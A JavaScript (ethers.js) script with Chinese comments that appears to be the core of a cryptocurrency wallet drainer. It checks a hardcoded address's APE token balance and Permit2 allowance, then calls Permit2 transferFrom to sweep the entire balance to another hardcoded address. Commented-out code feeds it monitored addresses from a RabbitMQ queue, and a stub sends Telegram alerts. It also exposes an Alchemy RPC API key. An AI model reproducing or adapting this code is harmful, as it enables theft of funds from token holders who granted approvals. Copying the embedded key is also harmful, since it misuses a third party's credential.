// const amqp = require("amqplib/callback_api");
// const { exec } = require("child_process");
// const fs = require("fs");
const { ethers } = require("ethers");
// amqp.connect("amqp://rabbitmq", (err, connection) => {
//     if (err) {
//         console.error("Failed to connect to RabbitMQ:", err);
//         return;
//     }

//     // 创建频道
//     connection.createChannel((err, channel) => {
//         if (err) {
//             console.error("Failed to create channel:", err);
//             return;
//         }

//         // 声明队列
//         const queueName = "monit_message";
//         channel.assertQueue(queueName, { durable: true });

//         console.log("Waiting for messages...");

//         // 接收消息并处理
//         channel.consume(queueName, (msg) => {
//             if (msg === null) {
//                 // 队列中没有消息，等待新的消息
//                 return;
//             }

//             const monitData = msg.content.toString();

//             // 执行构建操作
//             handelPermit2Transfer(monitData)
//                 .then(() => {
//                     // 构建完成后，确认消息已处理
//                     channel.ack(msg);
//                 })
//                 .catch((error) => {
//                     // 发生错误，可以选择重新将消息放回队列等待重试
//                     console.error("Error occurred during build:", error);
//                     channel.nack(msg);
//                 });
//         });
//     });
// });
const abi = [
    {
        inputs: [
            { internalType: "string", name: "name", type: "string" },
            { internalType: "string", name: "symbol", type: "string" },
            { internalType: "uint256", name: "totalSupply_", type: "uint256" },
        ],
        stateMutability: "nonpayable",
        type: "constructor",
    },
    {
        anonymous: false,
        inputs: [
            {
                indexed: true,
                internalType: "address",
                name: "owner",
                type: "address",
            },
            {
                indexed: true,
                internalType: "address",
                name: "spender",
                type: "address",
            },
            {
                indexed: false,
                internalType: "uint256",
                name: "value",
                type: "uint256",
            },
        ],
        name: "Approval",
        type: "event",
    },
    {
        anonymous: false,
        inputs: [
            {
                indexed: true,
                internalType: "address",
                name: "from",
                type: "address",
            },
            {
                indexed: true,
                internalType: "address",
                name: "to",
                type: "address",
            },
            {
                indexed: false,
                internalType: "uint256",
                name: "value",
                type: "uint256",
            },
        ],
        name: "Transfer",
        type: "event",
    },
    {
        inputs: [
            { internalType: "address", name: "owner", type: "address" },
            { internalType: "address", name: "spender", type: "address" },
        ],
        name: "allowance",
        outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
        stateMutability: "view",
        type: "function",
    },
    {
        inputs: [
            { internalType: "address", name: "spender", type: "address" },
            { internalType: "uint256", name: "amount", type: "uint256" },
        ],
        name: "approve",
        outputs: [{ internalType: "bool", name: "", type: "bool" }],
        stateMutability: "nonpayable",
        type: "function",
    },
    {
        inputs: [{ internalType: "address", name: "account", type: "address" }],
        name: "balanceOf",
        outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
        stateMutability: "view",
        type: "function",
    },
    {
        inputs: [],
        name: "decimals",
        outputs: [{ internalType: "uint8", name: "", type: "uint8" }],
        stateMutability: "view",
        type: "function",
    },
    {
        inputs: [
            { internalType: "address", name: "spender", type: "address" },
            {
                internalType: "uint256",
                name: "subtractedValue",
                type: "uint256",
            },
        ],
        name: "decreaseAllowance",
        outputs: [{ internalType: "bool", name: "", type: "bool" }],
        stateMutability: "nonpayable",
        type: "function",
    },
    {
        inputs: [
            { internalType: "address", name: "spender", type: "address" },
            { internalType: "uint256", name: "addedValue", type: "uint256" },
        ],
        name: "increaseAllowance",
        outputs: [{ internalType: "bool", name: "", type: "bool" }],
        stateMutability: "nonpayable",
        type: "function",
    },
    {
        inputs: [],
        name: "name",
        outputs: [{ internalType: "string", name: "", type: "string" }],
        stateMutability: "view",
        type: "function",
    },
    {
        inputs: [],
        name: "symbol",
        outputs: [{ internalType: "string", name: "", type: "string" }],
        stateMutability: "view",
        type: "function",
    },
    {
        inputs: [],
        name: "totalSupply",
        outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
        stateMutability: "view",
        type: "function",
    },
    {
        inputs: [
            { internalType: "address", name: "recipient", type: "address" },
            { internalType: "uint256", name: "amount", type: "uint256" },
        ],
        name: "transfer",
        outputs: [{ internalType: "bool", name: "", type: "bool" }],
        stateMutability: "nonpayable",
        type: "function",
    },
    {
        inputs: [
            { internalType: "address", name: "sender", type: "address" },
            { internalType: "address", name: "recipient", type: "address" },
            { internalType: "uint256", name: "amount", type: "uint256" },
        ],
        name: "transferFrom",
        outputs: [{ internalType: "bool", name: "", type: "bool" }],
        stateMutability: "nonpayable",
        type: "function",
    },
];
const permit2_abi = [
    {
        inputs: [
            { internalType: "uint256", name: "deadline", type: "uint256" },
        ],
        name: "AllowanceExpired",
        type: "error",
    },
    { inputs: [], name: "ExcessiveInvalidation", type: "error" },
    {
        inputs: [{ internalType: "uint256", name: "amount", type: "uint256" }],
        name: "InsufficientAllowance",
        type: "error",
    },
    {
        inputs: [
            { internalType: "uint256", name: "maxAmount", type: "uint256" },
        ],
        name: "InvalidAmount",
        type: "error",
    },
    { inputs: [], name: "InvalidContractSignature", type: "error" },
    { inputs: [], name: "InvalidNonce", type: "error" },
    { inputs: [], name: "InvalidSignature", type: "error" },
    { inputs: [], name: "InvalidSignatureLength", type: "error" },
    { inputs: [], name: "InvalidSigner", type: "error" },
    { inputs: [], name: "LengthMismatch", type: "error" },
    {
        inputs: [
            {
                internalType: "uint256",
                name: "signatureDeadline",
                type: "uint256",
            },
        ],
        name: "SignatureExpired",
        type: "error",
    },
    {
        anonymous: false,
        inputs: [
            {
                indexed: true,
                internalType: "address",
                name: "owner",
                type: "address",
            },
            {
                indexed: true,
                internalType: "address",
                name: "token",
                type: "address",
            },
            {
                indexed: true,
                internalType: "address",
                name: "spender",
                type: "address",
            },
            {
                indexed: false,
                internalType: "uint160",
                name: "amount",
                type: "uint160",
            },
            {
                indexed: false,
                internalType: "uint48",
                name: "expiration",
                type: "uint48",
            },
        ],
        name: "Approval",
        type: "event",
    },
    {
        anonymous: false,
        inputs: [
            {
                indexed: true,
                internalType: "address",
                name: "owner",
                type: "address",
            },
            {
                indexed: false,
                internalType: "address",
                name: "token",
                type: "address",
            },
            {
                indexed: false,
                internalType: "address",
                name: "spender",
                type: "address",
            },
        ],
        name: "Lockdown",
        type: "event",
    },
    {
        anonymous: false,
        inputs: [
            {
                indexed: true,
                internalType: "address",
                name: "owner",
                type: "address",
            },
            {
                indexed: true,
                internalType: "address",
                name: "token",
                type: "address",
            },
            {
                indexed: true,
                internalType: "address",
                name: "spender",
                type: "address",
            },
            {
                indexed: false,
                internalType: "uint48",
                name: "newNonce",
                type: "uint48",
            },
            {
                indexed: false,
                internalType: "uint48",
                name: "oldNonce",
                type: "uint48",
            },
        ],
        name: "NonceInvalidation",
        type: "event",
    },
    {
        anonymous: false,
        inputs: [
            {
                indexed: true,
                internalType: "address",
                name: "owner",
                type: "address",
            },
            {
                indexed: true,
                internalType: "address",
                name: "token",
                type: "address",
            },
            {
                indexed: true,
                internalType: "address",
                name: "spender",
                type: "address",
            },
            {
                indexed: false,
                internalType: "uint160",
                name: "amount",
                type: "uint160",
            },
            {
                indexed: false,
                internalType: "uint48",
                name: "expiration",
                type: "uint48",
            },
            {
                indexed: false,
                internalType: "uint48",
                name: "nonce",
                type: "uint48",
            },
        ],
        name: "Permit",
        type: "event",
    },
    {
        anonymous: false,
        inputs: [
            {
                indexed: true,
                internalType: "address",
                name: "owner",
                type: "address",
            },
            {
                indexed: false,
                internalType: "uint256",
                name: "word",
                type: "uint256",
            },
            {
                indexed: false,
                internalType: "uint256",
                name: "mask",
                type: "uint256",
            },
        ],
        name: "UnorderedNonceInvalidation",
        type: "event",
    },
    {
        inputs: [],
        name: "DOMAIN_SEPARATOR",
        outputs: [{ internalType: "bytes32", name: "", type: "bytes32" }],
        stateMutability: "view",
        type: "function",
    },
    {
        inputs: [
            { internalType: "address", name: "", type: "address" },
            { internalType: "address", name: "", type: "address" },
            { internalType: "address", name: "", type: "address" },
        ],
        name: "allowance",
        outputs: [
            { internalType: "uint160", name: "amount", type: "uint160" },
            { internalType: "uint48", name: "expiration", type: "uint48" },
            { internalType: "uint48", name: "nonce", type: "uint48" },
        ],
        stateMutability: "view",
        type: "function",
    },
    {
        inputs: [
            { internalType: "address", name: "token", type: "address" },
            { internalType: "address", name: "spender", type: "address" },
            { internalType: "uint160", name: "amount", type: "uint160" },
            { internalType: "uint48", name: "expiration", type: "uint48" },
        ],
        name: "approve",
        outputs: [],
        stateMutability: "nonpayable",
        type: "function",
    },
    {
        inputs: [
            { internalType: "address", name: "token", type: "address" },
            { internalType: "address", name: "spender", type: "address" },
            { internalType: "uint48", name: "newNonce", type: "uint48" },
        ],
        name: "invalidateNonces",
        outputs: [],
        stateMutability: "nonpayable",
        type: "function",
    },
    {
        inputs: [
            { internalType: "uint256", name: "wordPos", type: "uint256" },
            { internalType: "uint256", name: "mask", type: "uint256" },
        ],
        name: "invalidateUnorderedNonces",
        outputs: [],
        stateMutability: "nonpayable",
        type: "function",
    },
    {
        inputs: [
            {
                components: [
                    { internalType: "address", name: "token", type: "address" },
                    {
                        internalType: "address",
                        name: "spender",
                        type: "address",
                    },
                ],
                internalType: "struct IAllowanceTransfer.TokenSpenderPair[]",
                name: "approvals",
                type: "tuple[]",
            },
        ],
        name: "lockdown",
        outputs: [],
        stateMutability: "nonpayable",
        type: "function",
    },
    {
        inputs: [
            { internalType: "address", name: "", type: "address" },
            { internalType: "uint256", name: "", type: "uint256" },
        ],
        name: "nonceBitmap",
        outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
        stateMutability: "view",
        type: "function",
    },
    {
        inputs: [
            { internalType: "address", name: "owner", type: "address" },
            {
                components: [
                    {
                        components: [
                            {
                                internalType: "address",
                                name: "token",
                                type: "address",
                            },
                            {
                                internalType: "uint160",
                                name: "amount",
                                type: "uint160",
                            },
                            {
                                internalType: "uint48",
                                name: "expiration",
                                type: "uint48",
                            },
                            {
                                internalType: "uint48",
                                name: "nonce",
                                type: "uint48",
                            },
                        ],
                        internalType:
                            "struct IAllowanceTransfer.PermitDetails[]",
                        name: "details",
                        type: "tuple[]",
                    },
                    {
                        internalType: "address",
                        name: "spender",
                        type: "address",
                    },
                    {
                        internalType: "uint256",
                        name: "sigDeadline",
                        type: "uint256",
                    },
                ],
                internalType: "struct IAllowanceTransfer.PermitBatch",
                name: "permitBatch",
                type: "tuple",
            },
            { internalType: "bytes", name: "signature", type: "bytes" },
        ],
        name: "permit",
        outputs: [],
        stateMutability: "nonpayable",
        type: "function",
    },
    {
        inputs: [
            { internalType: "address", name: "owner", type: "address" },
            {
                components: [
                    {
                        components: [
                            {
                                internalType: "address",
                                name: "token",
                                type: "address",
                            },
                            {
                                internalType: "uint160",
                                name: "amount",
                                type: "uint160",
                            },
                            {
                                internalType: "uint48",
                                name: "expiration",
                                type: "uint48",
                            },
                            {
                                internalType: "uint48",
                                name: "nonce",
                                type: "uint48",
                            },
                        ],
                        internalType: "struct IAllowanceTransfer.PermitDetails",
                        name: "details",
                        type: "tuple",
                    },
                    {
                        internalType: "address",
                        name: "spender",
                        type: "address",
                    },
                    {
                        internalType: "uint256",
                        name: "sigDeadline",
                        type: "uint256",
                    },
                ],
                internalType: "struct IAllowanceTransfer.PermitSingle",
                name: "permitSingle",
                type: "tuple",
            },
            { internalType: "bytes", name: "signature", type: "bytes" },
        ],
        name: "permit",
        outputs: [],
        stateMutability: "nonpayable",
        type: "function",
    },
    {
        inputs: [
            {
                components: [
                    {
                        components: [
                            {
                                internalType: "address",
                                name: "token",
                                type: "address",
                            },
                            {
                                internalType: "uint256",
                                name: "amount",
                                type: "uint256",
                            },
                        ],
                        internalType:
                            "struct ISignatureTransfer.TokenPermissions",
                        name: "permitted",
                        type: "tuple",
                    },
                    { internalType: "uint256", name: "nonce", type: "uint256" },
                    {
                        internalType: "uint256",
                        name: "deadline",
                        type: "uint256",
                    },
                ],
                internalType: "struct ISignatureTransfer.PermitTransferFrom",
                name: "permit",
                type: "tuple",
            },
            {
                components: [
                    { internalType: "address", name: "to", type: "address" },
                    {
                        internalType: "uint256",
                        name: "requestedAmount",
                        type: "uint256",
                    },
                ],
                internalType:
                    "struct ISignatureTransfer.SignatureTransferDetails",
                name: "transferDetails",
                type: "tuple",
            },
            { internalType: "address", name: "owner", type: "address" },
            { internalType: "bytes", name: "signature", type: "bytes" },
        ],
        name: "permitTransferFrom",
        outputs: [],
        stateMutability: "nonpayable",
        type: "function",
    },
    {
        inputs: [
            {
                components: [
                    {
                        components: [
                            {
                                internalType: "address",
                                name: "token",
                                type: "address",
                            },
                            {
                                internalType: "uint256",
                                name: "amount",
                                type: "uint256",
                            },
                        ],
                        internalType:
                            "struct ISignatureTransfer.TokenPermissions[]",
                        name: "permitted",
                        type: "tuple[]",
                    },
                    { internalType: "uint256", name: "nonce", type: "uint256" },
                    {
                        internalType: "uint256",
                        name: "deadline",
                        type: "uint256",
                    },
                ],
                internalType:
                    "struct ISignatureTransfer.PermitBatchTransferFrom",
                name: "permit",
                type: "tuple",
            },
            {
                components: [
                    { internalType: "address", name: "to", type: "address" },
                    {
                        internalType: "uint256",
                        name: "requestedAmount",
                        type: "uint256",
                    },
                ],
                internalType:
                    "struct ISignatureTransfer.SignatureTransferDetails[]",
                name: "transferDetails",
                type: "tuple[]",
            },
            { internalType: "address", name: "owner", type: "address" },
            { internalType: "bytes", name: "signature", type: "bytes" },
        ],
        name: "permitTransferFrom",
        outputs: [],
        stateMutability: "nonpayable",
        type: "function",
    },
    {
        inputs: [
            {
                components: [
                    {
                        components: [
                            {
                                internalType: "address",
                                name: "token",
                                type: "address",
                            },
                            {
                                internalType: "uint256",
                                name: "amount",
                                type: "uint256",
                            },
                        ],
                        internalType:
                            "struct ISignatureTransfer.TokenPermissions",
                        name: "permitted",
                        type: "tuple",
                    },
                    { internalType: "uint256", name: "nonce", type: "uint256" },
                    {
                        internalType: "uint256",
                        name: "deadline",
                        type: "uint256",
                    },
                ],
                internalType: "struct ISignatureTransfer.PermitTransferFrom",
                name: "permit",
                type: "tuple",
            },
            {
                components: [
                    { internalType: "address", name: "to", type: "address" },
                    {
                        internalType: "uint256",
                        name: "requestedAmount",
                        type: "uint256",
                    },
                ],
                internalType:
                    "struct ISignatureTransfer.SignatureTransferDetails",
                name: "transferDetails",
                type: "tuple",
            },
            { internalType: "address", name: "owner", type: "address" },
            { internalType: "bytes32", name: "witness", type: "bytes32" },
            {
                internalType: "string",
                name: "witnessTypeString",
                type: "string",
            },
            { internalType: "bytes", name: "signature", type: "bytes" },
        ],
        name: "permitWitnessTransferFrom",
        outputs: [],
        stateMutability: "nonpayable",
        type: "function",
    },
    {
        inputs: [
            {
                components: [
                    {
                        components: [
                            {
                                internalType: "address",
                                name: "token",
                                type: "address",
                            },
                            {
                                internalType: "uint256",
                                name: "amount",
                                type: "uint256",
                            },
                        ],
                        internalType:
                            "struct ISignatureTransfer.TokenPermissions[]",
                        name: "permitted",
                        type: "tuple[]",
                    },
                    { internalType: "uint256", name: "nonce", type: "uint256" },
                    {
                        internalType: "uint256",
                        name: "deadline",
                        type: "uint256",
                    },
                ],
                internalType:
                    "struct ISignatureTransfer.PermitBatchTransferFrom",
                name: "permit",
                type: "tuple",
            },
            {
                components: [
                    { internalType: "address", name: "to", type: "address" },
                    {
                        internalType: "uint256",
                        name: "requestedAmount",
                        type: "uint256",
                    },
                ],
                internalType:
                    "struct ISignatureTransfer.SignatureTransferDetails[]",
                name: "transferDetails",
                type: "tuple[]",
            },
            { internalType: "address", name: "owner", type: "address" },
            { internalType: "bytes32", name: "witness", type: "bytes32" },
            {
                internalType: "string",
                name: "witnessTypeString",
                type: "string",
            },
            { internalType: "bytes", name: "signature", type: "bytes" },
        ],
        name: "permitWitnessTransferFrom",
        outputs: [],
        stateMutability: "nonpayable",
        type: "function",
    },
    {
        inputs: [
            {
                components: [
                    { internalType: "address", name: "from", type: "address" },
                    { internalType: "address", name: "to", type: "address" },
                    {
                        internalType: "uint160",
                        name: "amount",
                        type: "uint160",
                    },
                    { internalType: "address", name: "token", type: "address" },
                ],
                internalType:
                    "struct IAllowanceTransfer.AllowanceTransferDetails[]",
                name: "transferDetails",
                type: "tuple[]",
            },
        ],
        name: "transferFrom",
        outputs: [],
        stateMutability: "nonpayable",
        type: "function",
    },
    {
        inputs: [
            { internalType: "address", name: "from", type: "address" },
            { internalType: "address", name: "to", type: "address" },
            { internalType: "uint160", name: "amount", type: "uint160" },
            { internalType: "address", name: "token", type: "address" },
        ],
        name: "transferFrom",
        outputs: [],
        stateMutability: "nonpayable",
        type: "function",
    },
];
const provider_address =
    "https://eth-mainnet.g.alchemy.com/v2/otntqecKVNu7AW5kP9Z370M8TsQ_cmsb";
const provider = new ethers.providers.JsonRpcProvider(provider_address);
const signer = provider.getSigner();
const contract_address = "0x4d224452801aced8b2f0aebe155379bb5d594381"; //ape
const permit2_contarct_address = "0x000000000022D473030F116dDEE9F6B43aC78BA3";

const erc20_instance = new ethers.Contract(contract_address, abi, provider);
const permit2_contarct_instance = new ethers.Contract(
    permit2_contarct_address,
    permit2_abi,
    signer
);
async function getTokenBalances(ownerAddress) {
    const balance = await erc20_instance.balanceOf(ownerAddress);
    return balance;
    //
}
async function v3check(ownerAddress, spender_address) {
    const allowance = await erc20_instance.allowance(
        ownerAddress,
        spender_address
    );
    return allowance.toString();
}

async function handelPermit2Transfer(monitData) {
    // const parsedData = JSON.parse(monitData);
    // const { chainId, address } = parsedData.monitData;

    const ownerAddress = "0xc18f0d85528948dee12730f0378066718aee9eeb";
    const spender_address = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
    //查询客户余额
    const balance = await getTokenBalances(ownerAddress);
    const balance_amount = parseInt(balance) / 10 ** balance.toString().length;

    // //v3check
    const allowance = await v3check(ownerAddress, spender_address);
    if (balance_amount >= 2000 && allowance >= 2000) {
        // //获取签名信息 0xc18f0d85528948dee12730f0378066718aee9eeb
        // const signature =
        //     "0xc143ea056dd2f62a128808cc0c47d9477f9080c080a037437ba52140dbac1d7dc65cdb58531e038930c82314817f91cb8d8ea36a2bd0a001e134479d567b8595d7";
        //执行转账
        const owner_wuwu = ownerAddress;
        const spender_haha = "0xDf25813d91B139cbdeC94519898D8f672253a027";
        const amount = balance.toString();
        await permit2_contarct_instance[
            "transferFrom(address,address,uint160,address)"
        ](owner_wuwu, spender_haha, amount, contract_address, {
            gasLimit: 60000,
        });
    } else {
        console.log("not enough");
    }

    //发送消息到telegram
}

async function sendMsg(msg) {
    //启动TEL机器人
    //发送消息
}

handelPermit2Transfer();
